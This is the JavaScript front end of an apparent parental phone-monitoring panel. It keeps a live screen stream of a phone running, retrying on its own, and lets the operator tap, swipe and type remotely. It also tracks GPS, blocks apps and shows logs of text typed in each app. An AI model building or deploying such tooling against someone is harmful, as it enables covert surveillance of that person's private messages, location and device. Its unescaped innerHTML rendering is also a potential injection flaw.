(function () {
  const tokenKey = 'parent_token';
  let ws = null;
  let currentToken = null;
  let activeAgentId = 'Honor 400 (telefono)';
  let isLiveActive = false;
  let leafletMapInstance = null;
  let mapMarker = null;

  // Resolucion nativa de pantalla del Honor 400 (DNY-NX9)
  const DEVICE_WIDTH = 1264;
  const DEVICE_HEIGHT = 2736;

  // Elementos del DOM
  const loginView = document.getElementById('loginView');
  const mainView = document.getElementById('mainView');
  const loginForm = document.getElementById('loginForm');
  const passwordInput = document.getElementById('password');
  const loginError = document.getElementById('loginError');
  const logoutBtn = document.getElementById('logoutBtn');

  // Dispositivos y Control Remoto
  const agentsTable = document.getElementById('agentsTable').querySelector('tbody');
  const noAgents = document.getElementById('noAgents');
  const screenStatusBadge = document.getElementById('screenStatusBadge');
  const liveImg = document.getElementById('liveImg');
  const livePlaceholder = document.getElementById('livePlaceholder');
  const phoneScreenContainer = document.getElementById('phoneScreenContainer');
  const touchFeedback = document.getElementById('touchFeedback');

  // Prevenir arrastre de imagen del navegador
  liveImg.setAttribute('draggable', 'false');
  liveImg.addEventListener('dragstart', (e) => e.preventDefault());

  // Botones de Mando y Navegacion
  const btnNavBack = document.getElementById('btnNavBack');
  const btnNavHome = document.getElementById('btnNavHome');
  const btnNavRecents = document.getElementById('btnNavRecents');
  const btnWake = document.getElementById('btnWake');
  const btnLock = document.getElementById('btnLock');
  const btnVolDown = document.getElementById('btnVolDown');
  const btnVolUp = document.getElementById('btnVolUp');
  const btnRequestGps = document.getElementById('btnRequestGps');
  const remoteTextInput = document.getElementById('remoteTextInput');
  const btnSendText = document.getElementById('btnSendText');

  // Fechas y Tablas
  const reportDate = document.getElementById('reportDate');
  const reportTable = document.getElementById('reportTable').querySelector('tbody');
  const noReport = document.getElementById('noReport');

  const locationDate = document.getElementById('locationDate');
  const locationTable = document.getElementById('locationTable').querySelector('tbody');
  const noLocation = document.getElementById('noLocation');

  const typingDate = document.getElementById('typingDate');
  const typingTable = document.getElementById('typingTable').querySelector('tbody');
  const noTyping = document.getElementById('noTyping');

  const pdfTodayBtn = document.getElementById('pdfTodayBtn');
  const pdfTable = document.getElementById('pdfTable').querySelector('tbody');
  const noPdf = document.getElementById('noPdf');

  const typingModal = document.getElementById('typingModal');
  const typingModalClose = document.getElementById('typingModalClose');
  const typingLog = document.getElementById('typingLog');

  function todayStr() {
    const d = new Date();
    return d.toISOString().slice(0, 10);
  }

  function initDates() {
    const t = todayStr();
    reportDate.value = t;
    locationDate.value = t;
    typingDate.value = t;
  }

  // ---------- API Helpers ----------
  async function api(path, options = {}) {
    const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
    if (currentToken) headers['Authorization'] = `Bearer ${currentToken}`;
    const res = await fetch(path, { credentials: 'same-origin', ...options, headers });
    if (res.status === 401) {
      logout();
      throw new Error('Sesión expirada');
    }
    if (!res.ok) {
      const err = await res.json().catch(() => ({ message: res.statusText }));
      throw new Error(err.message || 'Error del servidor');
    }
    return res.json();
  }

  // ---------- Auth & WebSocket ----------
  function showMain() {
    loginView.classList.add('hidden');
    mainView.classList.remove('hidden');
    initDates();
    initLeafletMap();
    loadAgents();
    loadAll();
    connectWs();
  }

  function showLogin() {
    mainView.classList.add('hidden');
    loginView.classList.remove('hidden');
    passwordInput.value = '';
    loginError.textContent = '';
  }

  function logout() {
    sessionStorage.removeItem(tokenKey);
    currentToken = null;
    if (ws) { ws.close(); ws = null; }
    showLogin();
  }

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    loginError.textContent = '';
    try {
      const data = await api('/api/login', {
        method: 'POST',
        body: JSON.stringify({ password: passwordInput.value })
      });
      currentToken = data.token;
      sessionStorage.setItem(tokenKey, currentToken);
      showMain();
    } catch (err) {
      loginError.textContent = err.message || 'Contraseña incorrecta';
    }
  });

  logoutBtn.addEventListener('click', logout);

  function connectWs() {
    if (ws) {
      try { ws.close(); } catch (e) {}
    }
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${proto}//${location.host}/ws`);

    ws.onopen = () => {
      ws.send(JSON.stringify({ type: 'panel.hello', token: currentToken }));
      ws.send(JSON.stringify({ type: 'agents.request' }));
      // Iniciar transmision automatica permanente sin requerir botones
      setTimeout(autoStartLive, 500);
    };

    ws.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data);
        handleWsMessage(msg);
      } catch (e) {}
    };

    ws.onclose = () => {
      setTimeout(connectWs, 2000);
    };
  }

  function autoStartLive() {
    if (activeAgentId) {
      sendWs({ type: 'live.start', agentId: activeAgentId });
    }
  }

  function sendWs(obj) {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(obj));
      return true;
    }
    return false;
  }

  function handleWsMessage(msg) {
    switch (msg.type) {
      case 'agents.updated':
        renderAgents(msg.agents);
        break;
      case 'live.accepted':
      case 'live.frame':
        isLiveActive = true;
        screenStatusBadge.innerHTML = `<span class="dot"></span> En Vivo Directo`;
        screenStatusBadge.className = 'status-indicator online';
        if (msg.image) {
          liveImg.src = 'data:image/jpeg;base64,' + msg.image;
        }
        livePlaceholder.classList.add('hidden');
        liveImg.classList.remove('hidden');
        break;
      case 'live.stopped':
        isLiveActive = false;
        liveImg.classList.add('hidden');
        livePlaceholder.classList.remove('hidden');
        // Auto-reintento para mantener la transmision siempre activa
        setTimeout(autoStartLive, 2000);
        break;
      case 'location.updated':
        if (locationDate.value === todayStr()) {
          loadLocation();
        }
        break;
      case 'activity.updated':
        loadReport();
        break;
      case 'typing.updated':
        loadTyping();
        break;
      case 'blockedApps.updated':
        currentBlockedApps = msg.apps || [];
        renderBlockedApps(currentBlockedApps);
        loadReport();
        break;
      case 'app_blocked':
        console.warn('App bloqueada en el teléfono:', msg.app);
        break;
    }
  }

  // ---------- Control Táctil y Gestos (Touch, Tap, Drag & Swipe) ----------
  let isPointerDown = false;
  let touchStartPos = null;
  let touchStartTime = 0;

  function getEventCoords(e) {
    if (e.touches && e.touches.length > 0) return { clientX: e.touches[0].clientX, clientY: e.touches[0].clientY };
    if (e.changedTouches && e.changedTouches.length > 0) return { clientX: e.changedTouches[0].clientX, clientY: e.changedTouches[0].clientY };
    return { clientX: e.clientX, clientY: e.clientY };
  }

  function getPhoneCoordinates(e) {
    const rect = phoneScreenContainer.getBoundingClientRect();
    const ev = getEventCoords(e);

    const relX = Math.max(0, Math.min(1, (ev.clientX - rect.left) / rect.width));
    const relY = Math.max(0, Math.min(1, (ev.clientY - rect.top) / rect.height));

    const phoneX = Math.round(relX * DEVICE_WIDTH);
    const phoneY = Math.round(relY * DEVICE_HEIGHT);

    return { phoneX, phoneY, clientX: ev.clientX - rect.left, clientY: ev.clientY - rect.top };
  }

  function showTouchFeedback(x, y) {
    touchFeedback.style.left = `${x}px`;
    touchFeedback.style.top = `${y}px`;
    touchFeedback.classList.remove('hidden');
    setTimeout(() => touchFeedback.classList.add('hidden'), 300);
  }

  function onPointerDown(e) {
    e.preventDefault();
    ensureActiveAgent();
    isPointerDown = true;
    const coords = getPhoneCoordinates(e);
    touchStartPos = coords;
    touchStartTime = Date.now();
    showTouchFeedback(coords.clientX, coords.clientY);
  }

  function onPointerUp(e) {
    if (!isPointerDown || !touchStartPos) return;
    isPointerDown = false;
    ensureActiveAgent();

    const endCoords = getPhoneCoordinates(e);
    const duration = Date.now() - touchStartTime;
    const dx = endCoords.phoneX - touchStartPos.phoneX;
    const dy = endCoords.phoneY - touchStartPos.phoneY;
    const dist = Math.hypot(dx, dy);

    if (dist < 30) {
      // Tap instantaneo
      sendWs({
        type: 'input.tap',
        agentId: activeAgentId,
        x: touchStartPos.phoneX,
        y: touchStartPos.phoneY
      });
    } else {
      // Deslizamiento rapido calibrado para Android
      sendWs({
        type: 'input.swipe',
        agentId: activeAgentId,
        x1: touchStartPos.phoneX,
        y1: touchStartPos.phoneY,
        x2: endCoords.phoneX,
        y2: endCoords.phoneY,
        duration: Math.max(120, Math.min(250, duration))
      });
    }
    touchStartPos = null;
  }

  // Soporte universal para Mouse y Pantallas Tactiles
  phoneScreenContainer.addEventListener('mousedown', onPointerDown);
  window.addEventListener('mouseup', onPointerUp);

  phoneScreenContainer.addEventListener('touchstart', onPointerDown, { passive: false });
  phoneScreenContainer.addEventListener('touchend', onPointerUp, { passive: false });

  function ensureActiveAgent() {
    if (!activeAgentId) {
      activeAgentId = 'Honor 400 (telefono)';
    }
  }

  // ---------- Acciones de Navegación y Botones ----------
  btnNavBack.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'back' });
  });

  btnNavHome.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'home' });
  });

  btnNavRecents.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'recents' });
  });

  btnWake.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'wake' });
  });

  btnLock.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'lock' });
  });

  btnVolDown.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'volume_down' });
  });

  btnVolUp.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'volume_up' });
  });

  btnRequestGps.addEventListener('click', () => {
    ensureActiveAgent();
    sendWs({ type: 'command.send', agentId: activeAgentId, command: 'request_location' });
    btnRequestGps.style.filter = 'brightness(1.5)';
    setTimeout(() => { btnRequestGps.style.filter = ''; }, 1000);
  });

  btnSendText.addEventListener('click', () => {
    ensureActiveAgent();
    const text = remoteTextInput.value.trim();
    if (!text) return;
    sendWs({ type: 'input.text', agentId: activeAgentId, text: text });
    remoteTextInput.value = '';
  });

  remoteTextInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btnSendText.click();
  });

  // ---------- Carga y Renderizado de Dispositivos ----------
  async function loadAgents() {
    try {
      const list = await api('/api/agents');
      renderAgents(list);
    } catch (e) {}
  }

  function renderAgents(list) {
    agentsTable.innerHTML = '';
    if (!list || !list.length) {
      noAgents.classList.remove('hidden');
      activeAgentId = 'Honor 400 (telefono)';
      return;
    }
    noAgents.classList.add('hidden');

    list.forEach((a) => {
      if (!activeAgentId && a.online) {
        activeAgentId = a.id;
      }

      const tr = document.createElement('tr');
      const last = a.lastSeen ? new Date(a.lastSeen).toLocaleTimeString() : '—';
      const statusPill = a.online 
        ? `<span class="status-indicator online"><span class="dot"></span> Conectado</span>`
        : `<span class="status-indicator"><span class="dot" style="background:#ef4444"></span> Desconectado</span>`;

      tr.innerHTML = `
        <td><strong>📱 ${a.deviceName || a.id}</strong></td>
        <td>${statusPill}</td>
        <td>${last}</td>
        <td>
          <button class="btn-secondary select-agent-btn" data-id="${a.id}">
            ${activeAgentId === a.id ? '⭐ En Control' : 'Seleccionar'}
          </button>
        </td>
      `;
      agentsTable.appendChild(tr);
    });

    document.querySelectorAll('.select-agent-btn').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        activeAgentId = e.currentTarget.getAttribute('data-id');
        autoStartLive();
        loadAll();
      });
    });
  }

  // ---------- Mapa Interactivo Leaflet ----------
  function initLeafletMap() {
    if (leafletMapInstance) return;
    const mapEl = document.getElementById('leafletMap');
    if (!mapEl) return;

    leafletMapInstance = L.map('leafletMap').setView([-12.0464, -77.0428], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '&copy; OpenStreetMap contributors'
    }).addTo(leafletMapInstance);
  }

  function updateMapLocation(lat, lon, accuracy) {
    if (!leafletMapInstance) initLeafletMap();
    if (!lat || !lon) return;

    leafletMapInstance.setView([lat, lon], 16);
    if (mapMarker) {
      mapMarker.setLatLng([lat, lon]);
    } else {
      mapMarker = L.marker([lat, lon]).addTo(leafletMapInstance);
    }
    mapMarker.bindPopup(`<b>📍 Honor 400</b><br>Precisión: ${accuracy || 15}m`).openPopup();
  }

  // ---------- Carga de Datos y Reportes ----------
  let currentBlockedApps = [];

  async function loadBlockedApps() {
    try {
      currentBlockedApps = await api('/api/blocked_apps');
      renderBlockedApps(currentBlockedApps);
    } catch (e) {}
  }

  function renderBlockedApps(list) {
    const tbody = document.getElementById('blockedAppsList');
    const emptyState = document.getElementById('noBlockedApps');
    if (!tbody) return;
    tbody.innerHTML = '';
    if (!list || !list.length) {
      if (emptyState) emptyState.classList.remove('hidden');
      return;
    }
    if (emptyState) emptyState.classList.add('hidden');
    list.forEach((app) => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td><strong>🚫 ${app}</strong></td>
        <td><span class="badge-tag" style="background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid #ef4444;">Bloqueada</span></td>
        <td>
          <button class="btn-secondary unblock-btn" data-app="${app}" style="padding: 4px 10px; font-size: 11px;">
            ✅ Desbloquear
          </button>
        </td>
      `;
      tbody.appendChild(tr);
    });

    document.querySelectorAll('.unblock-btn').forEach((btn) => {
      btn.addEventListener('click', async (e) => {
        const app = e.currentTarget.getAttribute('data-app');
        try {
          await api(`/api/blocked_apps/${encodeURIComponent(app)}`, { method: 'DELETE' });
          await loadBlockedApps();
          loadReport();
        } catch (err) {
          alert('Error desbloqueando app: ' + err.message);
        }
      });
    });
  }

  const btnAddBlockApp = document.getElementById('btnAddBlockApp');
  const customBlockAppInput = document.getElementById('customBlockAppInput');
  if (btnAddBlockApp && customBlockAppInput) {
    btnAddBlockApp.addEventListener('click', async () => {
      const app = customBlockAppInput.value.trim();
      if (!app) return;
      try {
        await api('/api/blocked_apps', {
          method: 'POST',
          body: JSON.stringify({ app })
        });
        customBlockAppInput.value = '';
        await loadBlockedApps();
        loadReport();
      } catch (err) {
        alert('Error bloqueando app: ' + err.message);
      }
    });
  }

  async function loadReport() {
    try {
      const data = await api(`/api/activity?date=${reportDate.value}`);
      reportTable.innerHTML = '';
      let total = 0;
      for (const [dev, list] of Object.entries(data)) {
        list.forEach((item) => {
          total++;
          const tr = document.createElement('tr');
          const mins = Math.round((item.durationSec || 0) / 60);
          const isBlocked = currentBlockedApps.includes(item.app);
          const blockBtnHtml = isBlocked
            ? `<button class="btn-secondary toggle-block-btn" data-app="${item.app}" data-action="unblock" style="padding:4px 8px; font-size:11px; color:#10b981;">✅ Desbloquear</button>`
            : `<button class="btn-action danger toggle-block-btn" data-app="${item.app}" data-action="block" style="padding:4px 8px; font-size:11px;">🚫 Bloquear</button>`;
          
          tr.innerHTML = `
            <td><strong>${item.app}</strong></td>
            <td><span class="badge-tag">${mins} min (${item.durationSec || 0}s)</span></td>
            <td>${blockBtnHtml}</td>
          `;
          reportTable.appendChild(tr);
        });
      }
      noReport.classList.toggle('hidden', total > 0);

      document.querySelectorAll('.toggle-block-btn').forEach((btn) => {
        btn.addEventListener('click', async (e) => {
          const app = e.currentTarget.getAttribute('data-app');
          const action = e.currentTarget.getAttribute('data-action');
          try {
            if (action === 'block') {
              await api('/api/blocked_apps', { method: 'POST', body: JSON.stringify({ app }) });
            } else {
              await api(`/api/blocked_apps/${encodeURIComponent(app)}`, { method: 'DELETE' });
            }
            await loadBlockedApps();
            loadReport();
          } catch (err) {
            alert('Error modificando estado de la app: ' + err.message);
          }
        });
      });
    } catch (e) {}
  }

  async function loadLocation() {
    try {
      const data = await api(`/api/location?date=${locationDate.value}`);
      locationTable.innerHTML = '';
      let total = 0;
      let latest = null;

      for (const [dev, list] of Object.entries(data)) {
        list.slice().reverse().forEach((loc) => {
          total++;
          if (!latest) latest = loc;
          const tr = document.createElement('tr');
          const time = loc.ts ? new Date(loc.ts).toLocaleTimeString() : '—';
          tr.innerHTML = `
            <td>${time}</td>
            <td>${dev}</td>
            <td><code>${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}</code></td>
            <td><span class="badge-tag">±${loc.accuracy || 10}m</span></td>
            <td><a href="https://maps.google.com/?q=${loc.lat},${loc.lon}" target="_blank" class="btn-secondary" style="padding:4px 10px; font-size:11px;">Google Maps ↗</a></td>
          `;
          locationTable.appendChild(tr);
        });
      }
      noLocation.classList.toggle('hidden', total > 0);
      if (latest) {
        updateMapLocation(latest.lat, latest.lon, latest.accuracy);
      }
    } catch (e) {}
  }

  async function loadTyping() {
    try {
      const data = await api(`/api/typing?date=${typingDate.value}`);
      typingTable.innerHTML = '';
      let total = 0;
      for (const [dev, list] of Object.entries(data)) {
        list.slice().reverse().forEach((item) => {
          total++;
          const tr = document.createElement('tr');
          const time = item.ts ? item.ts.slice(11, 19) : '—';
          const preview = item.text.length > 90 ? item.text.slice(0, 90) + '...' : item.text;
          tr.innerHTML = `
            <td>${time}</td>
            <td><span class="badge-tag">${item.app}</span></td>
            <td style="font-family:monospace; color:#60a5fa;">${escapeHtml(preview)}</td>
          `;
          tr.addEventListener('click', () => {
            typingModalTitle.textContent = `${item.app} (${time})`;
            typingLog.textContent = item.text;
            typingModal.classList.remove('hidden');
          });
          typingTable.appendChild(tr);
        });
      }
      noTyping.classList.toggle('hidden', total > 0);
    } catch (e) {}
  }

  async function loadPdfs() {
    try {
      const list = await api('/api/pdfs');
      pdfTable.innerHTML = '';
      noPdf.classList.toggle('hidden', list.length > 0);
      list.forEach((item) => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td><strong>📅 Reporte del ${item.date}</strong></td>
          <td><a href="/api/pdf/${item.date}" class="btn-secondary" style="padding:6px 14px;" download>Descargar PDF</a></td>
        `;
        pdfTable.appendChild(tr);
      });
    } catch (e) {}
  }

  pdfTodayBtn.addEventListener('click', () => {
    window.open(`/api/pdf/${todayStr()}`, '_blank');
  });

  typingModalClose.addEventListener('click', () => {
    typingModal.classList.add('hidden');
  });

  reportDate.addEventListener('change', loadReport);
  locationDate.addEventListener('change', loadLocation);
  typingDate.addEventListener('change', loadTyping);

  function escapeHtml(str) {
    return (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function loadAll() {
    loadAgents();
    loadBlockedApps();
    loadReport();
    loadLocation();
    loadTyping();
    loadPdfs();
  }

  // Auto-login con token existente
  const savedToken = sessionStorage.getItem(tokenKey);
  if (savedToken) {
    currentToken = savedToken;
    showMain();
  } else {
    showLogin();
  }
})();
